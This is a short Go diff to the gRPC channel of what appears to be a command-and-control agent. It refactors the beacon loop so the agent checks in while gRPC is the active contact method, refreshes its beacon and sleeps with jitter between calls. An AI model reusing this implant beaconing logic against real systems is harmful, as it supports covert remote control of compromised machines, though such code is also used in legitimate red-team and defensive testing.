@@ -19,10 +19,11 @@ func init() {
 	CommunicationChannels["grpc"] = GRPC{}
 }
 
-func (contact GRPC) Communicate(agent *util.AgentConfig, beacon Beacon) {
-	for {
+func (contact GRPC) Communicate(agent *util.AgentConfig, beacon Beacon) Beacon {
+	for agent.Contact == "grpc" {
+		refreshBeacon(agent, &beacon)
 		beacon.Links = beacon.Links[:0]
-		for {
+		for agent.Contact == "grpc" {
 			body := beaconSend(agent.Address, beacon)
 			var tempB Beacon
 			json.Unmarshal(body, &tempB)
@@ -43,6 +44,7 @@ func (contact GRPC) Communicate(agent *util.AgentConfig, beacon Beacon) {
 		}
 		jitterSleep(agent.Sleep, "GRPC")
 	}
+	return beacon
 }
 
 func beaconSend(address string, beacon Beacon) []byte {
